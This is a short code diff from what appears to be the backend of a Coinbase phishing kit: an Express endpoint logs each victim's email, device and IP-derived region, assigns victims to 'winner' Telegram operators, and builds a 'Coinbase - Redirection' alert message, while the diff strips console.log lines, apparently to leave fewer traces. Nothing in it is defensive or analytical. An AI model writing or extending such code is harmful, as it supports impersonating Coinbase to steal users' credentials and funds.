@@ -361,11 +361,9 @@ app.post("/send-redirection", async (req, res) => {
     const device = detectDevice(userAgent);
     const region = await detectRegion(ip);
 
-    console.log(`📍 ${email} | Redirection page | Device: ${device} | Region: ${region}`);
 
     // ✅ CHECK WINNER
     const winner = userWinnerTelegram[email];
-    console.log(`🏆 Winner for ${email}: ${winner}`);
 
     const message =
       `😈😈😈 <b>Coinbase - Redirection</b> 😈😈😈\n` +
@@ -404,7 +402,6 @@ app.post("/send-redirection", async (req, res) => {
         email: email,
         timestamp: Date.now()
       };
-      console.log(`💾 Stored page 2 message data for ${email} (waiting for loser click)`);
 
     } else {
       
